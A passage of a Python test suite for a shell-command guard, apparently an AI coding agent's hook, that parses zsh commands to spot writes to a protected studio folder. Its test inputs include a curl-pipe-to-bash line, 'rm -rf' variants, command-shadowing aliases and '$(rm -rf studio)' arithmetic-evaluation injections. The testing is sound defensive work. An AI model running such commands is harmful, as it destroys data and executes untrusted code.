"""M0d-1a walking: cwd sets, environment, wrappers, lock.py, s2v forms, opaque forms, expansions
(m0d1a-plan §10.1, §10.5-§10.10)."""

import os

from guard_base import GuardCase, snapshot_text
from stdo import guard


class Cwd(GuardCase):
    def setUp(self):
        super().setUp()
        for d in ("x", "sub", "a", "b", "studio/work", "link-target/inner"):
            self.mk(d)
        os.symlink(os.path.join(self.root, "link-target", "inner"), os.path.join(self.root, "link"))
        self.R = lambda *p: os.path.join(self.root, *p)

    def cw(self, r, prog, i=0):
        return self.by_prog(r, prog)[i].cwds

    def test_hook_cwd_from_previous_call(self):
        # "앞선 호출에서 cd한 뒤 상대 경로 쓰기": the hook cwd already reflects the earlier cd
        r = self.ok("echo x > studio/work/state.json", cwd=self.R("sub"))
        self.assertEqual(r.commands[0].cwds, [self.R("sub")])
        r = self.ok("cd studio && echo x > work/state.json")
        self.assertEqual(self.one(r, "echo").cwds, [self.R("studio")])

    def test_subshell_and_group(self):
        r = self.ok("( cd x; rm y ); rm z")
        self.assertEqual([c.cwds for c in self.by_prog(r, "rm")], [[self.R("x")], [self.root]])
        r = self.ok("{ cd x; rm y; }; rm z")
        self.assertEqual([c.cwds for c in self.by_prog(r, "rm")], [[self.R("x")], [self.R("x")]])

    def test_cd_success_and_failure(self):
        self.assertEqual(self.cw(self.ok("cd x && touch y"), "touch"), [self.R("x")])
        self.assertEqual(self.cw(self.ok("cd nope && touch y"), "touch"), [self.R("nope")])
        self.assertEqual(self.cw(self.ok("cd nope; touch y"), "touch"), [self.R("nope"), self.root])
        self.assertEqual(self.cw(self.ok("cd x; touch y"), "touch"), [self.R("x")])
        # review 13: judged as if the shell went on (review 12's early stop removed)
        self.assertEqual(self.cw(self.ok("cd nope || exit; touch y"), "touch"), [self.R("nope")])
        self.assertEqual(self.cw(self.ok("mkdir nope; cd nope || exit; touch y"), "touch"), [self.R("nope")])
        self.assertEqual(self.cw(self.ok("{ cd nope || exit; }; touch y"), "touch"), [self.R("nope")])
        self.assertEqual(sorted(self.cw(self.ok("cd nope || true; touch y"), "touch")), sorted([self.R("nope"), self.root]))

    def test_home_and_tilde(self):
        home = self.env["HOME"]
        os.makedirs(os.path.join(home, "a"), exist_ok=True)
        self.assertEqual(self.cw(self.ok("cd; touch y"), "touch"), [home])
        self.assertEqual(self.cw(self.ok("cd ~/a; touch y"), "touch"), [os.path.join(home, "a")])
        r = self.ok("HOME=/tmp/h cd ~; touch y")
        self.assertEqual(self.cw(r, "touch"), [home])  # a prefix assignment is not used for expansion
        os.makedirs(os.path.join(self.tmp, "h2"))
        r = self.ok("export HOME=%s; cd ~; touch y" % os.path.join(self.tmp, "h2"))
        self.assertEqual(self.cw(r, "touch"), [os.path.join(self.tmp, "h2")])

    def test_cd_dash(self):
        self.assertEqual(self.cw(self.ok("cd x; cd -; touch y"), "touch"), [self.root])
        # review 10: zsh -c starts with $OLDPWD at its start folder (zsh 5.9); the environment's is one more candidate
        self.assertEqual(self.cw(self.ok("cd -; touch y"), "touch"), [self.root])
        self.env["OLDPWD"] = self.R("a")
        self.assertEqual(sorted(self.cw(self.ok("cd -; touch y"), "touch")), sorted([self.root, self.R("a")]))

    def test_cd_idioms(self):
        os.makedirs(self.R(".git"))
        self.mk("sub", "deeper")
        r = self.ok('cd "$(git rev-parse --show-toplevel)"; touch y', cwd=self.R("sub", "deeper"))
        self.assertEqual(self.cw(r, "touch"), [os.path.realpath(self.root)])
        r = self.ok('cd "$(git -C .. rev-parse --show-toplevel)"; touch y', cwd=self.R("sub", "deeper"))
        self.assertEqual(self.cw(r, "touch"), [os.path.realpath(self.root)])
        self.assertEqual(self.cw(self.ok('cd "$PWD/a"; touch y'), "touch"), [self.R("a")])
        self.assertEqual(self.cw(self.ok('cd "$(dirname "$0")"; touch y'), "touch"), [])

    def test_logical_and_physical(self):
        self.assertEqual(self.cw(self.ok("cd ..; touch y", cwd=self.R("x")), "touch"), [self.root])
        self.assertEqual(self.cw(self.ok("cd link/..; touch y"), "touch"), [self.root])
        self.assertEqual(self.cw(self.ok("cd -P link; touch y"), "touch"),
                         [os.path.realpath(self.R("link-target", "inner"))])

    def test_pushd_popd_autopushd(self):
        self.mk("a", "b")
        self.assertEqual(self.cw(self.ok("pushd a; pushd b; popd; touch c"), "touch"), [self.R("a")])
        self.assertEqual(self.cw(self.ok("pushd a; pushd; touch c"), "touch"), [self.root])
        # review 9: an empty stack — popd fails and the shell stays (zsh 5.9: "directory stack empty")
        self.assertEqual(self.cw(self.ok("popd; touch c"), "touch"), [self.root])
        # review 10 conf m-2: the pushd may or may not have run — popd is judged on both stacks
        self.assertEqual(sorted(self.cw(self.ok("[[ -e x ]] && pushd a; popd; touch c"), "touch")),
                         sorted([self.root, self.R("a")]))
        self.assertEqual(self.cw(self.ok("pushd +1; touch c"), "touch"), [])
        # review 10 M2: with no snapshot AUTO_PUSHD may be on or off — cd pushes or not
        self.assertEqual(sorted(self.cw(self.ok("cd a; cd b; popd; touch c"), "touch")),
                         sorted([self.root, self.R("a"), self.R("a", "b")]))
        # autopushd on (in the snapshot): cd pushes too
        self.use_snapshots(self.snapshot_text())
        self.assertEqual(self.cw(self.ok("cd a; cd b; popd; touch c"), "touch"), [self.R("a")])

    def test_autopushd_off(self):
        self.use_snapshots(self.snapshot_text(unsetopts=("autopushd",)))
        # review 9: nothing was pushed — popd fails and the shell stays where `cd a; cd b` left it
        self.assertEqual(self.cw(self.ok("cd a; cd b; popd; touch c"), "touch"),
                         self.cw(self.ok("cd a; cd b; touch c"), "touch"))

    def snapshot_text(self, **kw):
        from guard_base import snapshot_text
        kw.setdefault("path", self.bin)
        return snapshot_text(**kw)

    def test_cdpath(self):
        self.env["CDPATH"] = "/somewhere"
        self.assertEqual(self.cw(self.ok("cd foo; touch y"), "touch"), [])
        self.assertEqual(self.cw(self.ok("cd ./x; touch y"), "touch"), [self.R("x")])
        del self.env["CDPATH"]
        for cmd in ("cdpath=(/x); cd foo; touch y", "cdpath+=(/x); cd foo; touch y", "CDPATH=/x; cd foo; touch y"):
            self.assertEqual(self.cw(self.ok(cmd), "touch"), [], cmd)

    def test_pipelines(self):
        self.assertEqual(self.cw(self.ok("true | cd x; touch y"), "touch"), [self.R("x")])
        # zsh runs the last element in the current shell: its variables persist, earlier ones do not
        self.assertEqual(self.one(self.ok("true | X=studio; rm -rf $X/local"), "rm").argv[-1], "studio/local")
        self.assertIsNone(self.one(self.ok("Y=studio | true; rm -rf $Y/local"), "rm").argv[-1])
        self.assertEqual(self.cw(self.ok("cd x | true; touch y"), "touch"), [self.root])

    def test_background(self):
        self.assertEqual(self.cw(self.ok("cd x & touch y"), "touch"), [self.root])

    def test_loops(self):
        r = self.ok("for d in a b; do cd $d; rm f; done; rm g")
        self.assertEqual([c.cwds for c in self.by_prog(r, "rm")], [[], []])
        r = self.ok("for d in a b; do rm $d; done; rm g")
        self.assertEqual([c.cwds for c in self.by_prog(r, "rm")], [[self.root], [self.root]])

    def test_if_branches(self):
        r = self.ok("if test -d x; then cd x; fi; rm y")
        self.assertEqual(sorted(self.cw(r, "rm")), sorted([self.R("x"), self.root]))

    def test_shadowed_cd(self):
        r = self.ok("cd(){ :; }; cd x; rm y")
        self.assertEqual(self.cw(r, "rm"), [])

    def test_source(self):
        # fix20: the walk stops at a source — what follows is judged by the 0.0.26 rules alone (backstop)
        r = self.ok("source ./env.sh; rm y")
        self.assertTrue(r.sourced)
        self.assertEqual([c.prog for c in r.commands], ["source"])
        self.assertNotIn("source", self.kinds(r))  # the user's file is not read (the 0.0.26 guard reads it)
        r = self.ok("rm x; source /dev/stdin <<< 'rm z'; rm y")
        self.assertEqual([c.prog for c in r.commands], ["rm", "source"])
        self.assertIn("source", self.kinds(r))  # code given in the call itself: judged as a nested string

    def test_cwd_options(self):
        for cmd, prog in (("yarn --cwd sub x", "yarn"), ("yarn --cwd=sub x", "yarn"), ("npm --prefix sub run x", "npm"),
                          ("pnpm -C sub x", "pnpm"), ("make -C sub", "make"), ("tar -C sub -xf a.tar", "tar")):
            r = self.ok(cmd)
            c = r.commands[0]
            self.assertEqual(c.run_cwds, [self.R("sub")], cmd)
            self.assertEqual(c.cwds, [self.root], cmd)
        r = self.ok("env -C sub rm f")
        self.assertEqual(self.one(r, "rm").run_cwds, [self.R("sub")])

    def test_git_targets(self):
        r = self.ok("git -C a -C b status")
        g = self.one(r, "git")
        self.assertEqual(g.git.c_dirs, ["a", "b"])
        self.assertEqual(g.run_cwds, [self.R("a", "b")])
        r = self.ok("git --git-dir=../r/.git --work-tree=../r add x")
        g = self.one(r, "git").git
        self.assertEqual((g.git_dir, g.work_tree, g.sub), ("../r/.git", "../r", "add"))
        r = self.ok("GIT_DIR=../r/.git git status")
        self.assertIn("GIT_DIR", self.one(r, "git").git.env)
        r = self.ok("git -c alias.x='!rm -rf studio' x")
        self.assertEqual(self.one(r, "git").git.configs, [("alias.x", "!rm -rf studio")])
        r = self.ok("git -C sub clean -fdX src/")
        g = self.one(r, "git")
        self.assertEqual((g.git.sub, [w.value for w in g.git.args]), ("clean", ["-fdX", "src/"]))

    def test_symlinked_hook_cwd(self):
        r = self.ok("touch y", cwd=self.R("link"))
        self.assertEqual(r.commands[0].cwds, [self.R("link")])


class Env(GuardCase):
    def ops(self, c):
        return [(o.via, o.kind, o.name) for o in c.env.ops]

    def test_assignment_forms(self):
        r = self.ok("A=1 B=2 s2v x")
        self.assertEqual(self.ops(self.one(r, "s2v")), [("prefix", "set", "A"), ("prefix", "set", "B")])
        r = self.ok("A=1; s2v x")
        self.assertEqual(self.ops(self.one(r, "s2v")), [("assign", "set", "A")])
        r = self.ok("export A=1; declare -x B=2; typeset -x C=3; readonly D=4; export -n E; unset F; s2v x")
        self.assertEqual(self.ops(self.one(r, "s2v")),
                         [("export", "set", "A"), ("declare-x", "set", "B"), ("typeset-x", "set", "C"),
                          ("readonly", "set", "D"), ("export-n", "unset", "E"), ("unset", "unset", "F")])

    def test_env_wrapper(self):
        r = self.ok("env -u A s2v x; env -i s2v y; env -i A=1 s2v z; env - s2v w; env -- A=1 s2v v")
        cs = self.by_prog(r, "s2v")
        self.assertEqual(self.ops(cs[0]), [("env-u", "unset", "A")])
        self.assertTrue(cs[1].env.cleared)
        self.assertEqual(self.ops(cs[2]), [("env-i", "clear", None), ("env", "set", "A")])
        self.assertTrue(cs[3].env.cleared)
        self.assertEqual(self.ops(cs[4]), [("env", "set", "A")])
        r = self.ok("env -S 'rm studio/x' y")
        self.assertEqual(self.kinds(r), ["env-S"])

    def test_state_dir_and_home(self):
        r = self.ok("S2V_STATE_DIR=/x s2v tts a.md; HOME=/tmp/x s2v y")
        cs = self.by_prog(r, "s2v")
        self.assertEqual(cs[0].env.set["S2V_STATE_DIR"].value, "/x")
        self.assertEqual(cs[1].env.set["HOME"].value, "/tmp/x")
        r = self.ok("export S2V_STATE_DIR=/y; s2v z")
        self.assertEqual(self.one(r, "s2v").env.set["S2V_STATE_DIR"].value, "/y")
        r = self.ok("STUDIO_HOME=/z s2v q; unset CLAUDECODE; env -u CLAUDE_CODE_SESSION_ID git commit -m x")
        self.assertIn("STUDIO_HOME", self.one(r, "s2v").env.set)
        self.assertIn("CLAUDE_CODE_SESSION_ID", self.one(r, "git").env.unset)

    def test_known_variables(self):
        r = self.ok("X=studio; rm -rf $X/local")
        self.assertEqual(self.one(r, "rm").argv, ["rm", "-rf", "studio/local"])
        r = self.ok("X=a rm $X")
        self.assertIsNone(self.one(r, "rm").argv[1])  # X unset before: dynamic
        r = self.ok('rm "${X:-studio}/local"')
        w = self.one(r, "rm").words[1]
        self.assertTrue(w.dynamic)
        self.assertEqual(w.skeleton, "\0/local")

    def test_path_changes(self):
        r = self.ok("PATH=/tmp/bin:$PATH s2v x")
        self.assertIn("path-modified", self.one(r, "s2v").flags)
        for cmd in ("path=(/tmp/bin $path); s2v x", "path+=(/tmp/bin); s2v x", "path[1,0]=/tmp/bin; s2v x",
                    "export PATH=/opt/bin:/usr/bin; s2v x"):
            self.assertIn("path-modified", self.one(self.ok(cmd), "s2v").flags, cmd)
        r = self.ok("fpath+=(/tmp/f); foo")
        self.assertIn("fpath-changed", r.notes)

    def test_ifs(self):
        self.assertIn("ifs-changed", self.ok("IFS=/; echo x").notes)


class Wrappers(GuardCase):
    def test_builtins_precommands(self):
        r = self.ok("command rm x; command -v s2v; builtin cd /; exec rm y")
        rms = self.by_prog(r, "rm")
        self.assertEqual([[w.name for w in c.wrappers] for c in rms], [["command"], ["exec"]])
        q = [c for c in r.commands if "query" in c.flags]
        self.assertEqual(len(q), 1)
        r = self.ok("exec >log; exec 3>studio/x")
        self.assertEqual([c.redirs[0].target.value for c in r.commands], ["log", "studio/x"])

    def test_external_wrappers(self):
        for cmd in ("nohup rm x &", "time -p rm x", "/usr/bin/time -l rm x", "nice -n 5 rm x", "timeout 30 rm x",
                    "timeout -s KILL 5 rm x", "stdbuf -oL rm x", "caffeinate -i rm x", "noglob rm x"):
            r = self.ok(cmd)
            self.assertEqual(len(self.by_prog(r, "rm")), 1, cmd)
            self.assertEqual(self.by_prog(r, "rm")[0].argv, ["rm", "x"], cmd)

    def test_sudo(self):
        c = self.one(self.ok("sudo rm x"), "rm")
        self.assertTrue(c.env.cleared)
        c = self.one(self.ok("sudo -E rm x"), "rm")
        self.assertFalse(c.env.cleared)
        c = self.one(self.ok("sudo -u bob rm x"), "rm")
        self.assertEqual(c.wrappers[0].name, "sudo")
        self.assertEqual(self.kinds(self.ok("sudo -i rm x")), ["sudo-shell"])
        self.assertEqual(self.kinds(self.ok("sudo sh -c 'rm studio/x'")), ["shell-c"])

    def test_wrapper_chain(self):
        r = self.ok("sudo env -i nohup timeout 5 s2v tts a.md")
        c = self.one(r, "s2v")
        self.assertEqual([w.name for w in c.wrappers], ["sudo", "env", "nohup", "timeout"])
        self.assertTrue(c.env.cleared)

    def test_xargs_and_find(self):
        r = self.ok("xargs rm < list")
        t = [c for c in r.commands if "exec-template" in c.ctx]
        self.assertEqual(t[0].argv[:1], ["rm"])
        self.assertEqual(self.kinds(r), ["xargs"])
        r = self.ok("xargs -I{} cp {} studio/")
        self.assertEqual([h.term for h in r.opaque[0].hits], ["studio"])
        r = self.ok("find . -name x -exec rm {} \\; ; find . -exec rm {} + ; find . -execdir mv {} y \\; ; find . -ok rm {} \\;")
        self.assertEqual(self.kinds(r), ["find-exec"] * 4)
        r = self.ok("find studio -delete")
        self.assertEqual(r.opaque, [])
        self.assertEqual(self.one(r, "find").argv, ["find", "studio", "-delete"])

    def test_shadows(self):
        r = self.ok("alias rm='rm -rf studio'; rm x")
        self.assertIn("alias", self.kinds(r))
        self.assertIn("shadowed", [c for c in self.by_prog(r, "rm") if c.argv == ["rm", "x"]][0].flags)
        r = self.ok("hash -p /tmp/x rm; rm y")
        self.assertIn("shadowed", [c for c in self.by_prog(r, "rm") if c.argv == ["rm", "y"]][0].flags)
        r = self.ok("trap 'rm -rf studio/local' EXIT")
        self.assertEqual([h.term for h in r.opaque[0].hits], ["studio"])


class LockPy(GuardCase):
    def setUp(self):
        super().setUp()
        os.makedirs(os.path.join(self.root, ".git"))
        self.lock = self.mk(".claude", "studio", "scripts", "lock.py", file=True, text="#!/usr/bin/env python3\n")
        self.mk("studio", "work", "v", "state.json", file=True)

    def test_run_child(self):
        r = self.ok("python3 .claude/studio/scripts/lock.py run --kind tts -- s2v tts v.md")
        lk = [c for c in r.commands if c.lock][0]
        self.assertEqual((lk.lock.sub, lk.lock.kind, lk.lock.verified, lk.lock.usage_error), ("run", "tts", True, None))
        child = self.one(r, "s2v")
        self.assertIn("lock-child", child.ctx)
        self.assertEqual(child.parent, lk.id)
        self.assertEqual(child.s2v.args[0].value, "tts")

    def test_actor_op_and_approve(self):
        r = self.ok("python3 .claude/studio/scripts/lock.py actor-op hero b -- s2v character approve hero")
        lk = [c for c in r.commands if c.lock][0]
        self.assertEqual(lk.lock.ids, ["hero", "b"])
        self.assertEqual([w.value for w in self.one(r, "s2v").s2v.args[:2]], ["character", "approve"])

    def test_cp_inside_wrapper(self):
        r = self.ok("python3 .claude/studio/scripts/lock.py run --kind tts -- cp a studio/work/v/state.json")
        cp = self.one(r, "cp")
        self.assertIn("lock-child", cp.ctx)
        self.assertEqual(cp.argv[-1], "studio/work/v/state.json")

    def test_usage_errors_still_expand(self):
        r = self.ok('python3 .claude/studio/scripts/lock.py run --kind=tts --holder "two words" -- s2v x')
        lk = [c for c in r.commands if c.lock][0]
        self.assertTrue(lk.lock.usage_error)
        self.assertTrue(self.by_prog(r, "s2v"))
        r = self.ok("python3 .claude/studio/scripts/lock.py run --kind tts s2v x")
        self.assertTrue([c for c in r.commands if c.lock][0].lock.usage_error)
        self.assertEqual(self.by_prog(r, "s2v"), [])
        r = self.ok("python3 .claude/studio/scripts/lock.py status --json")
        self.assertEqual([c for c in r.commands if c.lock][0].lock.sub, "status")

    def test_env_inherited(self):
        r = self.ok("S2V_STATE_DIR=/x python3 .claude/studio/scripts/lock.py run --kind tts -- s2v x")
        self.assertEqual(self.one(r, "s2v").env.set["S2V_STATE_DIR"].value, "/x")

    def test_invocation_forms(self):
        os.chmod(self.lock, 0o755)
        for cmd in ("./.claude/studio/scripts/lock.py run --kind tts -- s2v x",
                    "%s run --kind tts -- s2v x" % self.lock,
                    "python3 -u .claude/studio/scripts/lock.py run --kind tts -- s2v x",
                    "env python3 .claude/studio/scripts/lock.py run --kind tts -- s2v x"):
            r = self.ok(cmd)
            lk = [c for c in r.commands if c.lock]
            self.assertTrue(lk and lk[0].lock.verified, cmd)
            self.assertTrue(self.by_prog(r, "s2v"), cmd)

    def test_unverified_lock(self):
        other = os.path.join(self.tmp, "elsewhere")
        os.makedirs(other)
        with open(os.path.join(other, "lock.py"), "w") as f:
            f.write("")
        r = self.ok("python3 %s/lock.py run --kind tts -- s2v x" % other)
        self.assertFalse([c for c in r.commands if c.lock][0].lock.verified)
        self.assertTrue(self.by_prog(r, "s2v"))

    def test_nesting(self):
        L = "python3 .claude/studio/scripts/lock.py run --kind tts --"
        r = self.ok("%s %s %s s2v x" % (L, L, L))
        self.assertEqual(len(self.by_prog(r, "s2v")), 1)
        r = self.ok("%s %s %s %s s2v x" % (L, L, L, L))
        self.assertEqual(self.by_prog(r, "s2v"), [])
        self.assertIn("lock-depth", r.notes)

    def test_lockargs_matches_lockcli(self):
        from stdo import lockargs, lockcli, locks
        self.assertIs(lockcli._parse, lockargs.parse)
        for argv in (["run", "--kind", "tts", "--", "s2v"], ["actor-op", "a", "--", "s2v"], ["status", "--json"],
                     ["run", "--kind=tts", "--", "s2v"], ["run", "--kind", "tts"], []):
            try:
                lockargs.parse(argv)
            except locks.UsageError:
                pass


class S2vForms(GuardCase):
    def setUp(self):
        super().setUp()
        self.p = os.path.join(self.tmp, "s2v")
        os.makedirs(os.path.join(self.p, "packages", "cli", "dist"))
        os.makedirs(os.path.join(self.p, "packages", "cli", "src"))
        self.main = os.path.join(self.p, "packages", "cli", "dist", "main.js")
        with open(self.main, "w") as f:
            f.write("#!/usr/bin/env node\n")
        os.chmod(self.main, 0o755)
        open(os.path.join(self.p, "packages", "cli", "src", "main.ts"), "w").close()

    def form(self, cmd, cwd=None):
        r = self.ok(cmd, cwd=cwd, s2v_path=self.p)
        c = [c for c in r.commands if c.s2v]
        self.assertTrue(c, cmd)
        return c[0].s2v

    def test_name_verified_by_path(self):
        self.exe("s2v", target=self.main)
        f = self.form("s2v tts a.md")
        self.assertEqual((f.form, f.accepted, f.verified), ("name", True, True))
        os.remove(os.path.join(self.bin, "s2v"))
        self.exe("s2v")
        f = self.form("s2v tts a.md")
        self.assertEqual((f.form, f.verified), ("name", False))
        os.remove(os.path.join(self.bin, "s2v"))
        self.assertFalse(self.form("s2v x").verified)

    def test_node_tsx(self):
        self.assertTrue(self.form("node %s tts" % self.main).accepted)
        self.assertTrue(self.form("node packages/cli/dist/main.js tts", cwd=self.p).accepted)
        rel = os.path.relpath(self.main, self.root)
        self.assertTrue(self.form("node %s tts" % rel).accepted)
        self.assertTrue(self.form("cd %s && node packages/cli/dist/main.js x" % self.p).accepted)
        self.assertTrue(self.form("tsx %s/packages/cli/src/main.ts x" % self.p).accepted)

    def test_runners(self):
        f = self.form("yarn --cwd %s s2v tts a.md" % self.p)
        self.assertEqual((f.form, f.accepted), ("yarn", True))
        self.assertEqual(self.form("yarn s2v x", cwd=self.p).accepted, True)
        f = self.form("yarn s2v x")
        self.assertEqual((f.form, f.accepted), ("yarn", False))
        for cmd in ("yarn run s2v x", "yarn --cwd=%s s2v x" % self.p, "npx -y s2v x", "pnpm s2v x", "bunx s2v x",
                    "npm exec s2v x"):
            f = self.form(cmd)
            self.assertEqual(f.form, "runner-other", cmd)
            self.assertFalse(f.accepted, cmd)
        self.assertTrue(self.form("npx s2v x", cwd=self.p).accepted)

    def test_paths_and_case(self):
        self.exe("s2v-real", target=self.main)
        f = self.form("%s/s2v-real x" % self.bin) if False else None
        link = os.path.join(self.tmp, "s2v")
        f = self.form("%s x" % os.path.join(self.p, "packages", "cli", "dist", "main.js"))
        self.assertEqual((f.form, f.verified), ("direct-main", True))
        lb = os.path.join(self.tmp, "lb")
        os.makedirs(lb)
        os.symlink(self.main, os.path.join(lb, "s2v"))
        f = self.form("%s/s2v x" % lb)
        self.assertEqual((f.form, f.verified), ("path-bin", True))
        other = os.path.join(self.tmp, "ob")
        os.makedirs(other)
        open(os.path.join(other, "s2v"), "w").close()
        self.assertFalse(self.form("%s/s2v x" % other).verified)
        f = self.form("S2V tts")
        self.assertEqual((f.form, f.accepted), ("name", False))
        del link

    def test_dynamic_and_prefixes(self):
        r = self.ok('"$S2V" tts', s2v_path=self.p)
        self.assertEqual(self.kinds(r), ["dynamic-command"])
        r = self.ok("$(which s2v) tts", s2v_path=self.p)
        self.assertIn("dynamic-command", self.kinds(r))
        self.assertIn("s2v", [h.term for o in r.opaque for h in o.hits])
        for cmd in ("command s2v x", "exec s2v x", "env s2v x"):
            self.assertEqual(self.form(cmd).form, "name", cmd)


class Opaques(GuardCase):
    def test_eval(self):
        r = self.ok('eval "rm studio/x"')
        self.assertEqual([h.term for h in r.opaque[0].hits], ["studio"])
        r = self.ok('eval "$x"')
        self.assertTrue(r.opaque[0].hits_unknown)
        self.assertEqual(self.ok("eval echo hi").opaque[0].hits, [])

    def test_shell_c(self):
        for cmd in ("bash -c 'rm studio/x'", "zsh -lc 'rm studio/x'", "bash -ec 'rm studio/x'", "bash -xc 'rm studio/x'"):
            r = self.ok(cmd)
            self.assertEqual(self.kinds(r), ["shell-c"], cmd)
            self.assertEqual([h.term for h in r.opaque[0].hits], ["studio"], cmd)
        self.assertEqual(self.ok("sh -c 'ls'").opaque[0].hits, [])

    def test_inline_interpreters(self):
        r = self.ok("python3 -c \"open('studio/work/v/state.json','w')\"")
        o = r.opaque[0]
        self.assertEqual(o.kind, "interp-inline")
        self.assertIn("studio/work/v/state.json", o.literals)
        for cmd in ("python -c 'x'", "python3.12 -c 'x'", "node -e 'x'", "node --eval='x'", "node -p 'x'",
                    "perl -e 'x'", "ruby -e 'x'", "php -r 'x'", "osascript -e 'x'", "deno eval 'x'", "bun -e 'x'"):
            self.assertEqual(self.kinds(self.ok(cmd)), ["interp-inline"], cmd)

    def test_outside_studio_passes(self):
        # "Studio 밖의 python -c · heredoc은 통과": opaque but no Studio terms
        for cmd in ("python3 -c 'print(1)'", "python3 - <<'EOF'\nimport json\nEOF\n"):
            r = self.ok(cmd)
            self.assertTrue(r.opaque, cmd)
            self.assertEqual(r.opaque[0].hits, [], cmd)

    def test_pipes_into_shells(self):
        r = self.ok("echo 'rm studio/x' | sh")
        self.assertEqual((r.opaque[0].kind, r.opaque[0].origin), ("stdin-interp", "pipe-literal"))
        self.assertEqual([h.term for h in r.opaque[0].hits], ["studio"])
        r = self.ok("curl https://example.invalid/x | bash")
        self.assertTrue([o for o in r.opaque if o.kind == "stdin-interp"][0].hits_unknown)

    def test_stdin_targets(self):
        for cmd, origin in (("source /dev/stdin <<'EOF'\nrm -rf studio/local\nEOF\n", "heredoc"),
                            (". /dev/fd/0 <<< 'rm studio/x'", "herestring"),
                            ("python3 /dev/stdin <<EOF\nopen('studio/x')\nEOF\n", "heredoc"),
                            ("python3 - <<< 'open(\"studio/x\")'", "herestring"),
                            ("bash -s <<'EOF'\nrm studio/x\nEOF\n", "heredoc"),
                            ("bash -s -- a b <<EOF\nrm studio/x\nEOF\n", "heredoc"),
                            ("zsh -s <<< 'rm studio/x'", "herestring"),
                            ("node - <<EOF\nrequire('fs').rmSync('studio/x')\nEOF\n", "heredoc")):
            r = self.ok(cmd)
            o = [x for x in r.opaque][0]
            self.assertEqual(o.origin, origin, cmd)
            self.assertEqual([h.term for h in o.hits], ["studio"], cmd)
        self.mk("f.sh", file=True, text="rm studio/x\n")
        r = self.ok("source /dev/stdin < f.sh")
        self.assertEqual(r.opaque[0].origin, "file")
        r = self.ok("echo 'rm studio/x' | source /dev/stdin")
        self.assertEqual(r.opaque[0].origin, "pipe-literal")

    def test_devnull_stdin(self):
        # the Bash tool runs `eval '<cmd>' < /dev/null`: a bare interpreter reads nothing
        r = self.ok("python3")
        self.assertEqual((r.opaque[0].origin, r.opaque[0].payload), ("devnull", ""))

    def test_scripts(self):
        self.mk("work", "run.sh", file=True, text="#!/bin/sh\nrm -rf studio/local\n")
        self.mk("scripts", "x.sh", file=True, text="#!/bin/sh\necho hi\n")
        r = self.ok("bash ./work/run.sh")
        o = r.opaque[0]
        self.assertEqual((o.kind, o.origin), ("script", "file"))
        self.assertEqual([h.term for h in o.hits], ["studio"])
        self.assertEqual(self.ok("./scripts/x.sh").opaque[0].hits, [])
        r = self.ok("bash /tmp/does-not-exist-%d.sh" % os.getpid())
        self.assertTrue(r.opaque[0].hits_unknown)
        self.assertEqual(r.opaque[0].path_class, ["tmp"])

    def test_awk_sed(self):
        self.assertEqual(self.ok("awk '{print $1}' f").opaque, [])
        self.assertEqual(self.kinds(self.ok("awk 'BEGIN{system(\"rm x\")}'")), ["awk-program"])
        self.assertEqual(self.ok("sed -i 's/a/b/' f").opaque, [])
        self.assertEqual(self.kinds(self.ok("sed 'e rm x' f")), ["sed-exec"])

    def test_misc(self):
        self.assertEqual(self.kinds(self.ok("parallel rm ::: a b")), ["parallel"])
        self.assertEqual(self.kinds(self.ok("watch -n1 ls")), ["shell-c"])  # G1 §1.3: procps runs sh -c

    def test_case_and_unicode_terms(self):
        from stdo.guard.terms import Terms
        t = Terms(paths=["studio/local"], words=["local"], fold=True)
        self.assertTrue(t.find("rm -rf STUDIO/LOCAL"))
        self.assertEqual(t.find("curl localhost"), [])
        nfd = Terms(paths=["스튜디오"]).find("rm 스튜디오/x")
        self.assertTrue(nfd)


class Expansion(GuardCase):
    def test_globs(self):
        w = self.one(self.ok("rm studio/*"), "rm").words[1]
        self.assertEqual((w.glob, w.glob_base), (True, "studio/"))
        w = self.one(self.ok("rm stud*"), "rm").words[1]
        self.assertEqual((w.glob, w.glob_base), (True, ""))
        self.assertTrue(self.one(self.ok("rm studio/**/x"), "rm").words[1].glob)
        self.assertTrue(self.one(self.ok("rm [s]tudio"), "rm").words[1].glob)
        self.assertFalse(self.one(self.ok("rm 'studio/*'"), "rm").words[1].glob)

    def test_braces(self):
        self.assertEqual(self.one(self.ok("rm studio/{a,b}.json"), "rm").argv,
                         ["rm", "studio/a.json", "studio/b.json"])
        self.assertEqual(self.one(self.ok("echo {1..3}"), "echo").argv, ["echo", "1", "2", "3"])
        self.assertEqual(self.one(self.ok("echo {a,{b,c}}"), "echo").argv, ["echo", "a", "b", "c"])
        w = self.one(self.ok("echo {1..100000}"), "echo").words[1]
        self.assertEqual(w.dyn, ["brace-overflow"])
        self.assertEqual(self.one(self.ok("echo '{a,b}'"), "echo").argv, ["echo", "{a,b}"])

    def test_tildes(self):
        home = self.env["HOME"]
        self.assertEqual(self.one(self.ok("ls ~ ~/x"), "ls").argv, ["ls", home, home + "/x"])
        self.assertTrue(self.one(self.ok("ls ~root"), "ls").words[1].dynamic)
        w = self.one(self.ok("cp a --out=~/x"), "cp").words[2]
        self.assertEqual((w.value, w.alt), ("--out=~/x", "--out=%s/x" % home))
        c = self.one(self.ok("X=~/x s2v"), "s2v")
        self.assertEqual(c.env.set["X"].value, home + "/x")
        r = self.ok("export X=a:~/b; s2v")
        self.assertEqual(self.one(r, "s2v").env.set["X"].value, "a:%s/b" % home)

    def test_equals_forms(self):
        w = self.one(self.ok("echo =~"), "echo").words[1]
        self.assertEqual((w.value, w.alt), ("=~", "\0"))
        self.assertEqual(self.one(self.ok("echo =git"), "echo").argv[1], os.path.join(self.bin, "git"))
        self.assertTrue(self.one(self.ok("echo =nope"), "echo").words[1].dynamic)

    def test_arith_eval(self):
        for cmd in ("i='$(rm -rf studio)'; echo $(( i ))", "i='$(rm -rf studio)'; a[$i]=1",
                    "i='$(rm -rf studio)'; (( i > 0 ))", "i='$(rm -rf studio)'; let i+1",
                    "i='$(rm -rf studio)'; [[ $i -eq 1 ]]"):
            r = self.ok(cmd)
            self.assertIn("arith-eval", self.kinds(r), cmd)
            self.assertEqual([h.term for o in r.opaque if o.kind == "arith-eval" for h in o.hits][:1], ["studio"], cmd)
        self.assertEqual(self.ok("i=3; echo $((i+1))").opaque, [])

    def test_dynamic_skeleton(self):
        r = self.ok('rm "$(echo studio)"/local')
        w = self.one(r, "rm").words[1]
        self.assertTrue(w.dynamic)
        self.assertEqual(w.skeleton, "\0/local")
        self.assertTrue([c for c in r.commands if c.prog == "echo"])

    def test_backslash_command_names(self):
        for cmd in ("\\rm x", "r\\m x", "'r'm x", "$'\\x72m' x", "command rm x", "/bin/rm x", "env rm x", "exec rm x"):
